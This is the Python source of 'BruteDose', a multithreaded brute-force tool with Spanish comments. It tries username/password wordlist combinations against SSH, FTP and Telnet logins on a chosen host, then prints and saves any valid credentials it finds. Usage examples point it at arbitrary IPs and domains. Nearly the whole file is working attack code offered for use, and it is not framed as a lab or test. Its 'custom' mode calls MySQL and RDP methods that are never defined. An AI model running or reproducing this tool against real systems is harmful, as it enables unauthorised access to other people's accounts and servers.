#!/usr/bin/env python3
"""
BruteDose - Herramienta de Fuerza Bruta Multiservicio
Creado por doseuser
GitHub: https://github.com/doseuser/brutedose
"""

import socket
import threading
import queue
import time
import sys
import os
import argparse
import ssl
import paramiko  # Necesitarás: pip install paramiko
import ftplib    # Librería estándar
from datetime import datetime

class BruteDose:
    def __init__(self, target, port, username_file=None, password_file=None, 
                 mode="connect", threads=50, timeout=3, verbose=False):
        """
        Inicializa BruteDose
        
        Args:
            target: IP o dominio del objetivo
            port: Puerto a atacar
            username_file: Archivo con usuarios (opcional)
            password_file: Archivo con contraseñas (opcional)
            mode: Modo de ataque (connect, ssh, ftp, telnet, etc.)
            threads: Número de hilos concurrentes
            timeout: Tiempo de espera para conexiones
            verbose: Modo verboso
        """
        self.target = target
        self.port = port
        self.username_file = username_file
        self.password_file = password_file
        self.mode = mode.lower()
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.found_credentials = []
        self.attempts = 0
        self.lock = threading.Lock()
        self.queue = queue.Queue()
        self.running = True
        
    def print_banner(self):
        """Muestra el banner de BruteDose"""
        banner = f"""
╔═══════════════════════════════════════════╗
║           BruteDose v2.0                  ║
║     Created by: doseuser                  ║
║     GitHub: doseuser/brutedose            ║
╚═══════════════════════════════════════════╝
Target: {self.target}
Port: {self.port}
Mode: {self.mode}
Threads: {self.threads}
Timeout: {self.timeout}s
        """
        print(banner)
    
    def load_wordlist(self, filename):
        """Carga una lista de palabras desde un archivo"""
        if not filename or not os.path.exists(filename):
            return []
        
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[-] Error cargando {filename}: {e}")
            return []
    
    def test_connection(self):
        """Prueba la conexión básica al puerto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            return result == 0
        except:
            return False
    
    def brute_connect(self):
        """Modo básico de conexión - solo prueba si el puerto está abierto"""
        print(f"[*] Probando conexión a {self.target}:{self.port}")
        
        if self.test_connection():
            print(f"[+] Puerto {self.port} ABIERTO en {self.target}")
            return True
        else:
            print(f"[-] Puerto {self.port} CERRADO en {self.target}")
            return False
    
    def brute_ssh(self, username, password):
        """Intento de conexión SSH"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target, port=self.port, 
                       username=username, password=password,
                       timeout=self.timeout, banner_timeout=self.timeout)
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            if self.verbose:
                print(f"[-] Error SSH: {e}")
            return False
    
    def brute_ftp(self, username, password):
        """Intento de conexión FTP"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=self.timeout)
            ftp.login(username, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except Exception as e:
            if self.verbose:
                print(f"[-] Error FTP: {e}")
            return False
    
    def brute_telnet(self, username, password):
        """Intento de conexión Telnet (simplificado)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            
            # Esperar prompt de login
            time.sleep(0.5)
            data = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Enviar usuario
            if username:
                sock.send(f"{username}\n".encode())
                time.sleep(0.5)
            
            # Enviar contraseña
            sock.send(f"{password}\n".encode())
            time.sleep(0.5)
            
            # Verificar respuesta
            data = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            # Verificación básica (puede necesitar ajustes)
            if "login incorrect" in data.lower() or "invalid" in data.lower():
                return False
            return True
        except:
            return False
    
    def brute_custom(self, username, password):
        """Ataque personalizado según el puerto"""
        # Diccionario de puertos comunes y sus servicios
        common_ports = {
            21: self.brute_ftp,
            22: self.brute_ssh,
            23: self.brute_telnet,
            3306: self.brute_mysql,  # Necesitarías implementar MySQL
            3389: self.brute_rdp,    # Necesitarías implementar RDP
        }
        
        if self.port in common_ports:
            return common_ports[self.port](username, password)
        else:
            # Intento genérico
            return self.brute_telnet(username, password)
    
    def worker(self):
        """Hilo worker para procesar credenciales"""
        while self.running:
            try:
                item = self.queue.get(timeout=1)
                if item is None:
                    break
                
                username, password = item
                
                with self.lock:
                    self.attempts += 1
                    if self.attempts % 100 == 0:
                        print(f"[*] Intentos: {self.attempts} | Encontrados: {len(self.found_credentials)}")
                
                success = False
                
                # Seleccionar método según modo
                if self.mode == "ssh":
                    success = self.brute_ssh(username, password)
                elif self.mode == "ftp":
                    success = self.brute_ftp(username, password)
                elif self.mode == "telnet":
                    success = self.brute_telnet(username, password)
                elif self.mode == "custom":
                    success = self.brute_custom(username, password)
                
                if success:
                    with self.lock:
                        self.found_credentials.append((username, password))
                    print(f"\n[+] CREDENCIALES ENCONTRADAS: {username}:{password}")
                
                self.queue.task_done()
                
            except queue.Empty:
                continue
            except Exception as e:
                if self.verbose:
                    print(f"[-] Error en worker: {e}")
    
    def start_bruteforce(self):
        """Inicia el ataque de fuerza bruta"""
        # Cargar listas
        usernames = []
        passwords = []
        
        if self.username_file:
            usernames = self.load_wordlist(self.username_file)
        else:
            usernames = [""]  # Usuario vacío para casos que no requieren usuario
        
        if self.password_file:
            passwords = self.load_wordlist(self.password_file)
        else:
            print("[-] Se requiere archivo de contraseñas para fuerza bruta")
            return False
        
        if not usernames or not passwords:
            print("[-] Listas de usuarios/contraseñas vacías")
            return False
        
        print(f"[*] Cargados {len(usernames)} usuarios y {len(passwords)} contraseñas")
        print(f"[*] Total de combinaciones: {len(usernames) * len(passwords)}")
        
        # Llenar cola
        for user in usernames:
            for pwd in passwords:
                self.queue.put((user, pwd))
        
        # Iniciar workers
        threads = []
        for i in range(min(self.threads, self.queue.qsize())):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        print(f"[*] Iniciando {len(threads)} hilos...")
        start_time = time.time()
        
        # Esperar a que termine la cola
        try:
            self.queue.join()
        except KeyboardInterrupt:
            print("\n[!] Interrumpido por el usuario")
            self.running = False
        
        # Parar workers
        for _ in range(len(threads)):
            self.queue.put(None)
        
        for t in threads:
            t.join()
        
        elapsed = time.time() - start_time
        
        # Mostrar resultados
        print("\n" + "="*50)
        print("RESULTADOS DE BRUTEDOSE")
        print("="*50)
        print(f"Target: {self.target}:{self.port}")
        print(f"Modo: {self.mode}")
        print(f"Tiempo total: {elapsed:.2f} segundos")
        print(f"Intentos: {self.attempts}")
        print(f"Velocidad: {self.attempts/elapsed:.2f} intentos/segundo")
        print(f"Credenciales encontradas: {len(self.found_credentials)}")
        
        if self.found_credentials:
            print("\n[+] Credenciales válidas:")
            for user, pwd in self.found_credentials:
                print(f"  {user}:{pwd}")
            
            # Guardar en archivo
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"brutedose_results_{timestamp}.txt"
            with open(filename, 'w') as f:
                f.write(f"BruteDose Results - {datetime.now()}\n")
                f.write(f"Target: {self.target}:{self.port}\n")
                f.write("="*50 + "\n")
                for user, pwd in self.found_credentials:
                    f.write(f"{user}:{pwd}\n")
            print(f"[+] Resultados guardados en {filename}")
        
        return len(self.found_credentials) > 0
    
    def run(self):
        """Ejecuta BruteDose"""
        self.print_banner()
        
        if not self.test_connection():
            print(f"[-] No se puede conectar a {self.target}:{self.port}")
            print("[-] Verifica la dirección IP y que el puerto esté abierto")
            return False
        
        if self.mode == "connect":
            return self.brute_connect()
        else:
            return self.start_bruteforce()

def main():
    parser = argparse.ArgumentParser(
        description="BruteDose - Herramienta de Fuerza Bruta Multiservicio",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  %(prog)s -t 192.168.1.1 -p 22 -U usuarios.txt -P contrasenas.txt -m ssh
  %(prog)s -t example.com -p 21 -P ftp_passwords.txt -m ftp
  %(prog)s -t 10.0.0.1 -p 23 -U users.txt -P pass.txt -m telnet
  %(prog)s -t 192.168.1.100 -p 3389 -m connect
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="IP o dominio del objetivo")
    parser.add_argument("-p", "--port", type=int, required=True, help="Puerto objetivo")
    parser.add_argument("-U", "--users", help="Archivo con lista de usuarios")
    parser.add_argument("-P", "--passwords", help="Archivo con lista de contraseñas")
    parser.add_argument("-m", "--mode", default="connect", 
                       choices=["connect", "ssh", "ftp", "telnet", "custom"],
                       help="Modo de ataque (default: connect)")
    parser.add_argument("-T", "--threads", type=int, default=50, 
                       help="Número de hilos (default: 50)")
    parser.add_argument("-to", "--timeout", type=int, default=3,
                       help="Timeout en segundos (default: 3)")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Modo verboso")
    
    args = parser.parse_args()
    
    # Validaciones básicas
    if args.mode != "connect" and not args.passwords:
        parser.error("El modo de fuerza bruta requiere un archivo de contraseñas (-P)")
    
    try:
        brute = BruteDose(
            target=args.target,
            port=args.port,
            username_file=args.users,
            password_file=args.passwords,
            mode=args.mode,
            threads=args.threads,
            timeout=args.timeout,
            verbose=args.verbose
        )
        
        brute.run()
        
    except KeyboardInterrupt:
        print("\n[!] Programa interrumpido por el usuario")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error crítico: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
